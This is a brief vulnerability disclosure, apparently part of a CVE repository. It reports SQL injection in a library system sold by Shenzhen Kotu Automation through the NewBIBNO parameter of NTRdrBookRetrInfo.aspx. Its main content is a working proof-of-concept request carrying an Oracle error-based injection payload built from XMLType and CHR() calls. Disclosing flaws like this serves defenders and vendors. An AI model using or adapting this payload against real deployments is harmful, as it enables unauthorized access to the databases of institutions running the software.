

## SQL injection into ilas online library

- Shenzhen Kotu Automation New Technology Co., Ltd

- NTRdrBookRetrInfo.aspx

- Parameter: NewBIBNO

### POC

```
NTRdrBookRetrInfo.aspx?BookRecno=341789&NewBIBNO=341789%20AND%206241=(SELECT%20UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(112)||CHR(112)||CHR(120)||CHR(113)||(SELECT%20(CASE%20WHEN%20(6241=6241)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)||CHR(62)))%20FROM%20DUAL)&NEWBOOK=newbook
```

![image-20240816101848450](https://github.com/shigophilo/CVE/blob/main/imgs/SQL%20injection%20into%20ilas%20online%20library/image-20240816101848450.png?raw=true)